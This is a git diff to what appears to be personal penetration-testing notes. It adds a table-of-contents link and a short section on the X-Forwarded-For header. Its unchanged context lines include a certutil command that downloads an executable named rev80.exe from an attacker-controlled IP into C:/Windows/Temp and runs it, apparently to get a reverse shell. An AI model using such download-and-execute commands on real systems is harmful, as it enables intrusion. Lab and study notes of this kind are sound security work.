@@ -8,6 +8,7 @@
 - [Feroxbuster](#feroxbuster)
 - [File Upload Vulnerability](#file-upload-vulnerability)
 - [Java Code Execution](#java-code-execution)
+- [HTTP Header](#http_header)
 
 # Checklist
 - [ ] NMAP scripts
@@ -86,4 +87,11 @@ http://example.com/uploads/uploadedsomething.txt
 ```bash
 certutil -urlcache -f http://192.168.45.176/rev80.exe C:/Windows/Temp/rev80.exe
 C:/Windows/Temp/rev80.exe
+```
+
+# HTTP Header
+```bash
+# signal the web server about the original client IP address
+X-Forwarded-For
+
 ```
